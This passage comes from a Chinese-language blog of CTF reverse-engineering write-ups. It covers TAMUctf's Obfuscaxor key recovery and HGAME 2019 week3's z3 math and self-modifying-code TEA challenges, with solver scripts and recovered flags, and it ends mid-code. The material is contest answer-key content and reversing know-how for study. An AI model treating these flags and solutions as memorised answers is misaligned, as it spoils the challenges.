<br>M4009-80070-00090-60BB2-00088<br>gigem&#123;z3_b3st_thr33&#125;<br><br></code></pre></td></tr></table></figure><h2 id="Obfuscaxor"><a href="#Obfuscaxor" class="headerlink" title="Obfuscaxor"></a>Obfuscaxor</h2><p>黑盒测试猜出来的答案<br>放进ida发现这部分有点奇怪，看汇编<br><img src="4.png" alt="o"><br>转成代码发现strcmp<br><img src="5.png" alt="o"><br>接下去就是猜了。。。<br>猜测加密方法<br>我们输入一串a进去<br>看输出<br><img src="6.png" alt="o"><br>4个一循环<br>那就可以猜测异或了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">a &#x3D; [0xAE, 0x9E, 0xFF, 0x9C, 0xAB, 0xC7, 0xD3, 0x81, 0xE7, 0xEE,<br>  0xFB, 0x8A, 0x9D, 0xEF, 0x8D, 0xAE]<br>b &#x3D; [0xBF, 0xCC, 0xDF, 0x8E]<br>key &#x3D; &#39;&#39;<br>for i in range(len(a)):<br>    key +&#x3D; chr(a[i]^b[i%4]^ord(&#39;a&#39;))<br>print key<br># p3Asujmn9CEeCB3A<br></code></pre></td></tr></table></figure><p>得到key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">pisanbao@pisanbao-virtual-machine:~$ nc rev.tamuctf.com 7224<br><br>Please Enter a product key to continue: <br>p3Asujmn9CEeCB3A<br>gigem&#123;x0r_64d5by&#125;<br><br></code></pre></td></tr></table></figure><p>pwn的话<br>有机会再总结下吧。。。</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HGAME 2019 week3</title>
    <link href="/2019/02/22/HGAME-2019-week3/"/>
    <url>/2019/02/22/HGAME-2019-week3/</url>
    
    <content type="html"><![CDATA[<p>闲来无事吧week3的wp写一下<br>week3总体来说难度没有week2大？？？<br>// 除了那道helloweb，第一次遇见没写出来<br>//而且反编译后有上万行的代码实在是看不下去了。。。</p><a id="more"></a><h2 id="Math-简单"><a href="#Math-简单" class="headerlink" title="Math 简单"></a>Math 简单</h2><p>很明显用z3去写啊<br>放进ida里复制一下关键函数代码就行<br>那个。。。因为原来题目链接挂了，这边我直接上代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs asm"># -*- coding: UTF-8 -*-<br>from z3 import *<br>s &#x3D; Solver()<br>v34 &#x3D; [BitVec(&#39;u%d&#39;%i,8) for i in range(32)]<br><br>s.add(v34[0]&#x3D;&#x3D;ord(&#39;h&#39;))<br>s.add(v34[1]&#x3D;&#x3D;ord(&#39;g&#39;))<br>s.add(v34[2]&#x3D;&#x3D;ord(&#39;a&#39;))<br>s.add(v34[3]&#x3D;&#x3D;ord(&#39;m&#39;))<br>s.add(v34[4]&#x3D;&#x3D;ord(&#39;e&#39;))<br>s.add(v34[5]&#x3D;&#x3D;ord(&#39;&#123;&#39;))<br>s.add(v34[31]&#x3D;&#x3D;ord(&#39;&#125;&#39;))<br><br><br><br>s.add(82 * v34[16] + 58 * v34[25] + 76 * v34[21] + 31 * v34[9] + 87 * v34[28] + 54 * v34[2] + 74 * v34[5] + 99 * v34[26]+ 94 * v34[3] + 84 * v34[19] + 32 * v34[15] + 90 * v34[27] + 16 * v34[14] + 19 * v34[8] + 33 * v34[20] + 35 * v34[31] + 65 * v34[29] + 47 * v34[12] + 3 * v34[1] + 57 * v34[7] + 5 * v34[17] + 70 * v34[13] + 28 * v34[24] + 79 * v34[11] + 63 * v34[23] + 66 * v34[30] + 28 * v34[10] + v34[4] + 81 * v34[6] + 61 * v34[18] + 31 * v34[22] + 71 * v34[0] &#x3D;&#x3D; 145397)<br>s.add(55 * v34[6] + 38 * v34[9] + 39 * v34[18] + 73 * v34[24] + 86 * v34[13] + 18 * v34[11] + 40 * v34[21] + 40 * v34[26] + 54 * v34[14] + 81 * v34[10] + 71 * v34[27] + 20 * v34[8] + 16 * v34[28] + 65 * v34[30] + 87 * v34[3] + 14 * v34[16] + v34[5] + 41 * v34[0] + 58 * v34[15] + 73 * v34[2] + 46 * v34[23] + 7 * v34[19] + 89 * v34[17] + 65 * v34[25] + 43 * v34[7] + 6 * v34[20] + 60 * v34[12] + 40 * v34[31] + 57 * v34[29] + 40 * v34[4] + 30 * v34[1] + 63 * v34[22] &#x3D;&#x3D; 127517)<br>s.add(28 * v34[6] + 17 * v34[21] + 18 * v34[3] + 53 * v34[10] + 82 * v34[14] + 70 * v34[5] + 84 * v34[2] + 57 * v34[19] + 92 * v34[27] + 57 * v34[11] + 77 * v34[4] + 49 * v34[8] + 62 * v34[29] + 97 * v34[22] + 47 * v34[1] + 30 * v34[16] + 45 * v34[30] + 94 * v34[28] + 6 * v34[9] + 83 * v34[20] + 18 * v34[23] + 97 * v34[15] + 11 * v34[12] + 35 * v34[7] + 81 * v34[26] + 67 * v34[13] + 11 * v34[31] + 84 * v34[24] + 63 * v34[25] + 61 * v34[18] &#x3D;&#x3D; 141411)<br>s.add(86 * v34[23] + 52 * v34[1] + 14 * v34[24] + 46 * v34[6] + 56 * v34[7] + 13 * v34[2] + 82 * v34[11] + 49 * v34[30] + 97 * v34[18] + 50 * v34[14] + 83 * v34[27] + 38 * v34[13] + 49 * v34[29] + 9 * v34[4] + 91 * v34[20] + 33 * v34[25] + 4 * v34[22] + 5 * v34[17] + 61 * v34[15] + 65 * v34[3] + 68 * v34[28] + 6 * v34[16] + (v34[8] &lt;&lt; 6) + 56 * v34[9] + 67 * v34[10] + 5 * v34[5] + v34[21] + 10 * v34[19] + 83 * v34[12] + 37 * v34[26] + 85 * v34[0] &#x3D;&#x3D; 117383)<br>s.add(53 * v34[3] + 91 * v34[2] + 57 * v34[25] + 66 * v34[20] + 9 * v34[28] + 63 * v34[5] + 20 * v34[4] + 96 * v34[8] + 39 * v34[11] + 91 * v34[1] + 40 * v34[9] + 85 * v34[14] + 62 * v34[16] + 95 * v34[19] + 34 * v34[22] + 67 * v34[31] + 51 * v34[27] + 45 * v34[26] + 92 * v34[15] + 91 * v34[21] + 85 * v34[13] + 12 * v34[7] + 26 * v34[23] + 56 * v34[30] + 82 * v34[18] + 72 * v34[17] + 54 * v34[6] + 17 * v34[12] + 84 * v34[29] + 17 * v34[0] + 8 * v34[24] + 63 * v34[10] &#x3D;&#x3D; 156152)<br>s.add(55 * v34[23] + 88 * v34[9] + 48 * v34[4] + 83 * v34[13] + 66 * v34[7] + 60 * v34[30] + 57 * v34[6] + 85 * v34[17] + 71 * v34[28] + 98 * v34[24] + 83 * v34[10] + 12 * v34[1] + 72 * v34[31] + 12 * v34[22] + 80 * v34[20] + 15 * v34[19] + 81 * v34[21] + 87 * v34[0] + 37 * v34[16] + 4 * v34[15] + 41 * v34[3] + 84 * v34[26] + 56 * v34[25] + 84 * v34[14] + 41 * v34[27] + 98 * v34[18] + 18 * v34[2] + 95 * v34[11] + 33 * v34[29] + 66 * v34[8] &#x3D;&#x3D; 148963)<br>s.add(43 * v34[16] + 47 * v34[0] + 53 * v34[24] + 75 * v34[11] + 57 * v34[21] + 63 * v34[12] + 4 * v34[14] + 59 * v34[31] + 15 * v34[23] + 12 * v34[25] + 58 * v34[5] + 40 * v34[4] + 26 * v34[30] + 8 * v34[15] + 25 * v34[6] + 97 * v34[10] + 12 * v34[28] + 74 * v34[26] + 65 * v34[8] + 93 * v34[27] + 18 * v34[22] + 84 * v34[2] + 7 * v34[1] + 22 * v34[18] + 9 * v34[17] + 89 * v34[19] + 72 * v34[13] + 47 * v34[20] + 7 * v34[29] + 8 * v34[9] + 24 * v34[7] + 75 * v34[3] &#x3D;&#x3D; 121517)<br>s.add(77 * v34[30] + 89 * v34[31] + 55 * v34[7] + 86 * v34[17] + 74 * v34[0] + 72 * v34[4] + 27 * v34[20] + 88 * v34[9] + (v34[21] &lt;&lt; 6) + 52 * v34[15] + 4 * v34[19] + 8 * v34[1] + 16 * v34[13] + 54 * v34[25] + 8 * v34[29] + 52 * v34[23] + 14 * v34[10] + 88 * v34[18] + 33 * v34[8] + 99 * v34[27] + 65 * v34[14] + 66 * v34[5] + 36 * v34[6] + 58 * v34[16] + 63 * v34[22] + 93 * v34[3] + 96 * v34[11] + 26 * v34[26] + 65 * v34[12] + 42 * v34[28] + 14 * v34[2] + 57 * v34[24] &#x3D;&#x3D; 151446)<br>s.add(53 * v34[24] + 95 * v34[27] + 51 * v34[7] + 42 * v34[4] + 78 * v34[8] + 45 * v34[25] + 63 * v34[30] + 85 * v34[26] + 30 * v34[29] + 83 * v34[14] + 62 * v34[31] + 71 * v34[22] + 45 * v34[17] + (v34[6] &lt;&lt; 6) + 87 * v34[23] + 49 * v34[28] + 14 * v34[0] + 4 * v34[21] + 63 * v34[5] + 53 * v34[13] + 19 * v34[19] + 44 * v34[16] + 5 * v34[3] + 74 * v34[15] + 19 * v34[18] + 89 * v34[11] + 11 * v34[20] + 34 * v34[12] + 14 * v34[1] + 87 * v34[10] + 63 * v34[9] + 70 * v34[2] &#x3D;&#x3D; 142830)<br>s.add(69 * v34[0] + 67 * v34[9] + 57 * v34[15] + 77 * v34[10] + 67 * v34[26] + 94 * v34[11] + 13 * v34[29] + 11 * v34[22] + 41 * v34[5] + 38 * v34[13] + 90 * v34[31] + 68 * v34[7] + 56 * v34[14] + 4 * v34[23] + 66 * v34[28] + 28 * v34[1] + 6 * v34[12] + 91 * v34[16] + 59 * v34[3] + 81 * v34[17] + 44 * v34[2] + 33 * v34[24] + 34 * v34[19] + 17 * v34[18] + 77 * v34[25] + 25 * v34[8] + 8 * v34[6] + 10 * v34[30] + 66 * v34[20] + 41 * v34[27] + 29 * v34[21] &#x3D;&#x3D; 122585)<br>s.add(31 * v34[9] + 17 * v34[4] + 6 * v34[28] + 23 * v34[25] + 32 * v34[3] + 72 * v34[15] + 41 * v34[26] + 33 * v34[30] + 82 * v34[13] + 20 * v34[0] + 7 * v34[12] + 25 * v34[29] + 39 * v34[21] + 57 * v34[14] + 14 * v34[16] + 24 * v34[24] + 37 * v34[22] + 71 * v34[10] + 65 * v34[23] + 46 * v34[8] + 40 * v34[19] + 77 * v34[27] + 80 * v34[18] + 88 * v34[6] + 20 * v34[31] + 83 * v34[11] + 73 * v34[1] + 8 * v34[5] + 15 * v34[20] + 70 * v34[7] + 24 * v34[17] + 16 * v34[2] &#x3D;&#x3D; 105293)<br>s.add(25 * v34[21] + 79 * v34[3] + 41 * v34[24] + 45 * v34[30] + 82 * v34[20] + 86 * v34[19] + 99 * v34[9] + 96 * v34[22] + 85 * v34[28] + 70 * v34[5] + 77 * v34[23] + 80 * v34[11] + 40 * v34[31] + 66 * v34[12] + 12 * v34[2] + 77 * v34[15] + 72 * v34[4] + 42 * v34[26] + 81 * v34[27] + 90 * v34[13] + 37 * v34[16] + 29 * v34[17] + 20 * v34[29] + 85 * v34[6] + 6 * v34[7] + 2 * v34[0] + 72 * v34[1] + 75 * v34[14] + 40 * v34[25] + 29 * v34[8] + 25 * v34[10] &#x3D;&#x3D; 151962)<br>s.add(83 * v34[11] + 75 * v34[1] + 42 * v34[31] + 95 * v34[30] + 58 * v34[8] + 47 * v34[13] + 65 * v34[15] + 24 * v34[17] + 97 * v34[10] + 24 * v34[21] + 28 * v34[0] + 77 * v34[5] + 97 * v34[6] + 24 * v34[26] + 32 * v34[12] + 5 * v34[25] + 55 * v34[28] + 9 * v34[23] + 85 * v34[4] + 6 * v34[9] + 61 * v34[19] + 12 * v34[3] + 76 * v34[7] + 36 * v34[27] + 77 * v34[24] + 24 * v34[29] + 67 * v34[14] + 19 * v34[16] + 47 * v34[20] + 13 * v34[22] &#x3D;&#x3D; 125609)<br>s.add(30 * v34[25] + 41 * v34[28] + 65 * v34[10] + v34[1] + 88 * v34[3] + 90 * v34[0] + 4 * v34[23] + 46 * v34[7] + 54 * v34[16] + 16 * v34[6] + 89 * v34[22] + 76 * v34[27] + 38 * v34[17] + 3 * v34[5] + 70 * v34[14] + 3 * v34[24] + 24 * v34[13] + 54 * v34[2] + 20 * v34[8] + 83 * v34[12] + 21 * v34[15] + 77 * v34[18] + 31 * v34[19] + 59 * v34[21] + 33 * v34[20] + 84 * v34[11] + 19 * v34[29] + 38 * v34[26] + 63 * v34[31] + 16 * v34[30] + 15 * v34[4] + 39 * v34[9] &#x3D;&#x3D; 123069)<br>s.add(6 * v34[9] + 19 * v34[19] + 27 * v34[18] + 48 * v34[4] + 13 * v34[20] + 44 * v34[10] + 70 * v34[12] + 44 * v34[17] + 22 * v34[23] + 55 * v34[14] + 73 * v34[26] + 55 * v34[8] + 58 * v34[11] + 31 * v34[30] + 78 * v34[29] + 19 * v34[25] + 52 * v34[31] + 27 * v34[21] + 38 * v34[27] + 40 * v34[28] + 35 * v34[1] + 48 * v34[22] + 71 * v34[15] + 24 * v34[6] + 89 * v34[16] + 37 * v34[3] + 78 * v34[2] + 3 * v34[5] + 52 * v34[24] + 40 * v34[7] &#x3D;&#x3D; 113842)<br>s.add(95 * v34[8] + 92 * v34[18] + 84 * v34[31] + 31 * v34[12] + 35 * v34[10] + 54 * v34[20] + 26 * v34[29] + 29 * v34[3] + 2 * v34[23] + 46 * v34[0] + 30 * v34[26] + 56 * v34[27] + 100 * v34[11] + 43 * v34[1] + 15 * v34[4] + 79 * v34[17] + 12 * v34[5] + 38 * v34[9] + 3 * v34[30] + 16 * v34[21] + 19 * v34[13] + 67 * v34[19] + 37 * v34[28] + v34[7] + 73 * v34[16] + 85 * v34[6] + 17 * v34[14] + 90 * v34[22] + 15 * v34[2] + 43 * v34[25] + 96 * v34[24] &#x3D;&#x3D; 119824)<br>s.add(36 * v34[22] + 69 * v34[28] + 77 * v34[6] + 92 * v34[20] + 43 * v34[23] + 16 * v34[19] + 92 * v34[5] + 49 * v34[26] + 44 * v34[2] + 26 * v34[29] + (v34[25] &lt;&lt; 6) + 45 * v34[24] + 99 * v34[11] + 43 * v34[4] + 75 * v34[21] + 53 * v34[31] + 18 * v34[18] + 11 * v34[13] + 52 * v34[0] + 16 * v34[8] + 9 * v34[7] + 77 * v34[16] + 33 * v34[10] + 86 * v34[1] + 33 * v34[3] + 29 * v34[9] + 6 * v34[12] + 91 * v34[14] + 36 * v34[15] + 94 * v34[27] + 13 * v34[30] + 89 * v34[17] &#x3D;&#x3D; 135873)<br>s.add(16 * v34[7] + v34[15] + 82 * v34[9] + 60 * v34[29] + 68 * v34[2] + 83 * v34[10] + 47 * v34[5] + 85 * v34[13] + 22 * v34[8] + 92 * v34[27] + 75 * v34[28] + 43 * v34[3] + 29 * v34[22] + 92 * v34[0] + 54 * v34[16] + 17 * v34[30] + 78 * v34[18] + 7 * v34[23] + 69 * v34[21] + 63 * v34[31] + 71 * v34[4] + 10 * v34[6] + 66 * v34[14] + 25 * v34[26] + 32 * v34[1] + 48 * v34[19] + 86 * v34[11] + 20 * v34[25] + 78 * v34[20] + 25 * v34[17] + 76 * v34[12] + 13 * v34[24] &#x3D;&#x3D; 142509)<br>s.add(88 * v34[22] + 23 * v34[13] + 18 * v34[14] + 77 * v34[9] + 56 * v34[30] + 79 * v34[2] + 71 * v34[29] + 95 * v34[28] + 87 * v34[24] + 62 * v34[16] + 85 * v34[26] + 43 * v34[20] + 67 * v34[15] + 97 * v34[8] + 80 * v34[0] + 23 * v34[3] + 95 * v34[25] + 82 * v34[21] + 66 * v34[31] + 5 * v34[4] + 66 * v34[27] + 25 * v34[12] + 4 * v34[5] + 12 * v34[7] + 85 * v34[1] + 10 * v34[6] + 45 * v34[11] + 28 * v34[18] + 26 * v34[19] + 48 * v34[23] + 45 * v34[17] &#x3D;&#x3D; 148888)<br>s.add(25 * v34[8] + 81 * v34[30] + 21 * v34[6] + 72 * v34[11] + 48 * v34[18] + 2 * v34[19] + 42 * v34[10] + 22 * v34[24] + 99 * v34[2] + 78 * v34[22] + 83 * v34[12] + 60 * v34[9] + 59 * v34[13] + 15 * v34[5] + 25 * v34[20] + 43 * v34[15] + 56 * v34[28] + 33 * v34[25] + 71 * v34[23] + 31 * v34[0] + 95 * v34[3] + 73 * v34[17] + 86 * v34[14] + 15 * v34[21] + 61 * v34[7] + 12 * v34[29] + 95 * v34[26] + 13 * v34[1] + 100 * v34[16] + 11 * v34[4] + 79 * v34[27] &#x3D;&#x3D; 138023)<br>s.add(37 * v34[28] + 62 * v34[25] + 42 * v34[18] + 53 * v34[27] + 52 * v34[29] + 70 * v34[22] + 35 * v34[30] + 50 * v34[16] + 59 * v34[8] + 75 * v34[10] + 55 * v34[20] + 23 * v34[0] + 52 * v34[17] + 47 * v34[3] + 91 * v34[13] + 46 * v34[7] + 42 * v34[14] + 79 * v34[26] + 87 * v34[21] + 30 * v34[6] + 26 * v34[1] + 57 * v34[31] + 33 * v34[12] + 51 * v34[9] + 56 * v34[24] + 59 * v34[11] + 36 * v34[23] + 88 * v34[4] + 28 * v34[2] + 44 * v34[15] + 19 * v34[19] + 74 * v34[5] &#x3D;&#x3D; 142299)<br>s.add(80 * v34[21] + 43 * v34[31] + 67 * v34[16] + 55 * v34[13] + 95 * v34[24] + 46 * v34[28] + 93 * v34[5] + 75 * v34[20] + 14 * v34[25] + 24 * v34[26] + 50 * v34[29] + 70 * v34[15] + 63 * v34[30] + 77 * v34[23] + 96 * v34[19] + 66 * v34[11] + 72 * v34[27] + 94 * v34[4] + 63 * v34[22] + 69 * v34[3] + 73 * v34[1] + 60 * v34[7] + 9 * v34[2] + 39 * v34[17] + 25 * v34[0] + 49 * v34[14] + 48 * v34[8] + 86 * v34[9] + 72 * v34[10] + 23 * v34[18] + 21 * v34[6] &#x3D;&#x3D; 155777)<br>s.add(25 * v34[24] + 11 * v34[22] + 27 * v34[11] + 40 * v34[8] + 53 * v34[15] + 40 * v34[18] + 56 * v34[3] + 2 * v34[2] + 32 * v34[4] + 90 * v34[1] + 54 * v34[16] + 20 * v34[9] + 86 * v34[17] + 82 * v34[31] + 43 * v34[25] + 43 * v34[13] + 86 * v34[21] + 17 * v34[0] + (v34[14] &lt;&lt; 6) + 6 * v34[30] + 86 * v34[5] + 15 * v34[7] + 46 * v34[12] + 21 * v34[26] + 90 * v34[20] + 19 * v34[6] + 93 * v34[23] + 31 * v34[27] + 62 * v34[29] + 21 * v34[19] + 42 * v34[10] &#x3D;&#x3D; 117687)<br>s.add(89 * v34[21] + 100 * v34[13] + v34[27] + 66 * v34[18] + 40 * v34[17] + 17 * v34[0] + 27 * v34[19] + 26 * v34[31] + 57 * v34[24] + 35 * v34[3] + 80 * v34[1] + 67 * v34[5] + 85 * v34[6] + 7 * v34[15] + 93 * v34[8] + 3 * v34[22] + 77 * v34[12] + 12 * v34[28] + 4 * v34[2] + 27 * v34[9] + 53 * v34[25] + 37 * v34[30] + 43 * v34[23] + 33 * v34[4] + 39 * v34[26] + 7 * v34[7] + 75 * v34[10] + 15 * v34[14] + 45 * v34[20] + 36 * v34[29] + 78 * v34[11] + 31 * v34[16] &#x3D;&#x3D; 117383)<br>s.add(73 * v34[20] + 16 * v34[26] + 100 * v34[5] + 71 * v34[28] + 71 * v34[16] + 4 * v34[1] + 77 * v34[31] + 83 * v34[2] + 11 * v34[30] + 53 * v34[19] + 85 * v34[12] + 67 * v34[13] + 39 * v34[8] + 45 * v34[24] + 84 * v34[22] + 99 * v34[14] + 38 * v34[3] + 29 * v34[4] + 90 * v34[9] + 61 * v34[18] + 40 * v34[7] + (v34[17] &lt;&lt; 6) + 9 * v34[25] + 86 * v34[29] + 80 * v34[21] + 4 * v34[15] + 96 * v34[23] + 99 * v34[10] + 40 * v34[27] + 4 * v34[0] + 56 * v34[11] &#x3D;&#x3D; 155741)<br>s.add((v34[12] &lt;&lt; 6) + 76 * v34[0] + 5 * v34[11] + 87 * v34[2] + 86 * v34[24] + 76 * v34[14] + 38 * v34[23] + 85 * v34[3] + 71 * v34[22] + 42 * v34[29] + 85 * v34[30] + 14 * v34[10] + 17 * v34[13] + 42 * v34[25] + 11 * v34[19] + 44 * v34[15] + 21 * v34[4] + 60 * v34[16] + 28 * v34[6] + 46 * v34[20] + 25 * v34[9] + 77 * v34[31] + 21 * v34[8] + 85 * v34[7] + 36 * v34[1] + 91 * v34[27] + 21 * v34[28] + 38 * v34[17] + 3 * v34[26] + 61 * v34[21] + 15 * v34[5] + 32 * v34[18] &#x3D;&#x3D; 132804)<br>s.add(95 * v34[30] + 75 * v34[28] + 3 * v34[10] + 36 * v34[1] + 60 * v34[3] + 84 * v34[11] + 19 * v34[26] + 76 * v34[27] + 86 * v34[16] + 92 * v34[8] + 96 * v34[14] + 60 * v34[21] + 23 * v34[4] + 60 * v34[12] + 50 * v34[23] + 78 * v34[22] + 45 * v34[9] + 42 * v34[18] + 10 * v34[2] + 60 * v34[20] + 24 * v34[24] + 77 * v34[7] + 41 * v34[6] + 29 * v34[13] + 33 * v34[5] + 2 * v34[15] + 33 * v34[29] + 39 * v34[31] + 41 * v34[25] + 100 * v34[19] + 9 * v34[17] + 79 * v34[0] &#x3D;&#x3D; 145568)<br>s.add(68 * v34[5] + 98 * v34[27] + 98 * v34[16] + 10 * v34[19] + 25 * v34[26] + 98 * v34[24] + 15 * v34[6] + 50 * v34[18] + 88 * v34[20] + 74 * v34[11] + 83 * v34[1] + 86 * v34[21] + 52 * v34[7] + 39 * v34[10] + 40 * v34[13] + 82 * v34[28] + 37 * v34[3] + 45 * v34[0] + 18 * v34[25] + 2 * v34[29] + 6 * v34[12] + 78 * v34[31] + 37 * v34[2] + 57 * v34[23] + 3 * v34[4] + 59 * v34[8] + 73 * v34[15] + v34[22] + 18 * v34[9] + 35 * v34[14] + 20 * v34[17] + 54 * v34[30] &#x3D;&#x3D; 130175)<br>s.add(60 * v34[10] + 50 * v34[12] + 30 * v34[29] + 90 * v34[19] + 68 * v34[23] + 60 * v34[18] + 93 * v34[20] + 100 * v34[11] + 98 * v34[14] + 32 * v34[3] + 15 * v34[21] + 79 * v34[0] + 6 * v34[24] + 62 * v34[26] + 96 * v34[6] + 68 * v34[22] + 9 * v34[7] + 88 * v34[5] + 18 * v34[27] + 70 * v34[9] + 96 * v34[25] + 89 * v34[4] + 14 * v34[31] + 83 * v34[17] + 19 * v34[15] + 44 * v34[1] + 96 * v34[8] + 87 * v34[16] + 48 * v34[2] + 95 * v34[13] + 73 * v34[28] + 92 * v34[30] &#x3D;&#x3D; 171986)<br>s.add(53 * v34[30] + 87 * v34[25] + 23 * v34[29] + 80 * v34[20] + 86 * v34[9] + 20 * v34[7] + 29 * v34[16] + 31 * v34[14] + 83 * v34[26] + 11 * v34[4] + 29 * v34[19] + 82 * v34[13] + 84 * v34[10] + 70 * v34[1] + 52 * v34[12] + 40 * v34[6] + 91 * v34[8] + 6 * v34[17] + 77 * v34[28] + 56 * v34[5] + 86 * v34[23] + 63 * v34[31] + 26 * v34[27] + 19 * v34[22] + 50 * v34[3] + 15 * v34[15] + 67 * v34[2] + 37 * v34[24] + 84 * v34[18] + 81 * v34[21] + 93 * v34[0] &#x3D;&#x3D; 151676)<br>s.add(29 * v34[3] + 93 * v34[5] + 67 * v34[21] + 12 * v34[11] + 82 * v34[24] + 100 * v34[8] + 29 * v34[26] + 97 * v34[12] + 32 * v34[6] + 26 * v34[27] + 46 * v34[19] + 8 * (v34[25] + 9 * v34[0] + 2 * v34[17]) + 63 * v34[10] + 39 * v34[29] + 81 * v34[15] + 51 * v34[13] + 31 * v34[30] + 49 * v34[4] + 3 * v34[22] + 26 * v34[28] + 15 * v34[20] + 89 * v34[2] + 5 * v34[31] + 47 * v34[18] + 19 * v34[23] + 98 * v34[9] + 15 * v34[16] + 49 * v34[1] &#x3D;&#x3D; 128223)<br>s.add(13 * v34[14] + 73 * v34[19] + 99 * v34[7] + 76 * v34[12] + 84 * v34[25] + 91 * v34[10] + 67 * v34[22] + 77 * v34[15] + 23 * v34[26] + 38 * v34[4] + 3 * v34[31] + 76 * v34[13] + 50 * v34[0] + 74 * v34[11] + 45 * v34[28] + 58 * v34[29] + 39 * v34[5] + 95 * v34[9] + 26 * v34[16] + 23 * v34[8] + 28 * v34[24] + 89 * v34[1] + 88 * v34[18] + 3 * v34[3] + 59 * v34[20] + 80 * v34[23] + 49 * v34[17] + 56 * v34[21] + 32 * v34[27] + 24 * v34[2] + 77 * v34[30] + 18 * v34[6] &#x3D;&#x3D; 138403)<br><br>flag &#x3D; &#39;&#39;<br>print s.check()<br>print s.model()<br>if s.check() &#x3D;&#x3D; sat:<br>    print s.model()<br>    result &#x3D; s.model()<br>    for i in range(32):<br>        flag +&#x3D; chr(result[v34[i]].as_long().real)<br>    print flag<br><br></code></pre></td></tr></table></figure><p>跑一下就行</p><h2 id="Say-Muggle-Code-a-k-a-SMC"><a href="#Say-Muggle-Code-a-k-a-SMC" class="headerlink" title="Say-Muggle-Code a.k.a. SMC"></a>Say-Muggle-Code a.k.a. SMC</h2><p>自我感觉这题比上周的smc简单 //手动滑稽<br>拖进ida，因为是c艹，看起来有点难受<br><img src="1.png" alt="smc1"><br>所以只能调试了<br>发现前面一大段程序主要是确定输入的数目是否为39<br>还有就是使用hgame{}开头结尾<br>真正的check在下面<br><img src="2.png" alt="smc2"><br>点击check1查看，check1是比较简单的<br><img src="3.png" alt="smc3"><br>直接解出来前半部分</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">a &#x3D; [0xDE, 0xD1, 0xD8, 0x8C, 0x8F, 0xD9, 0xDF, 0xDE, 0xDF, 0x8C,<br>  0xD8, 0xDA, 0x8C, 0xDC, 0xDD, 0xD8]<br>flag &#x3D; &#39;&#39;<br>for i in range(len(a)):<br>    flag +&#x3D; chr(a[i]^0xe9)<br>print flag          #781ef0676e13e541<br></code></pre></td></tr></table></figure><p>然后就是check2了，也就是本题的难点<br><img src="4.png" alt="smc4"><br>可以看到encrypt是一段数据，看汇编发现程序call了encrypt函数<br>那就很容易想到这边的代码段被加密过，调试发现是机器码与数值异或<br>运行时再进行解密，所以静态分析失败<br>只能调试了<br>跟进encrypt函数<br><img src="5.png" alt="smc5"><br>这是一个魔改过的TEA<br>不难   //但确实折腾了我好久，c语言的有些运算很奇葩<br>//和17届x1c面试题目差不多，但肯定没那个难<br>复制下伪代码就行<br>代码如下<br>头文件ida.h啥的自己加好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs asm">_DWORD *__fastcall encrypt(__int64 a1, _DWORD *a2);<br>int main()<br>&#123;<br>    int i;<br>    char a[]&#x3D;&#123;0xDB, 0xAA, 0x8E, 0x1E, 0x3A, 0xC6, 0xA9, 0x11, 0xF0, 0xA4,<br>  0xB8, 0x71, 0x03, 0x71, 0x55, 0x3E&#125;;<br>  char a2[]&#x3D;&#123;0x37, 0x0F, 0x09, 0x54, 0x03, 0x56, 0x06, 0x01, 0x01, 0x53,<br>  0x54, 0x02, 0x56, 0x50, 0x01, 0x05&#125;;<br>  encrypt((__int64)a, (_DWORD *)a2);<br>  for(i&#x3D;0;i&lt;16;i++)<br>  &#123;<br>      printf(&quot;%c&quot;,a[i]);            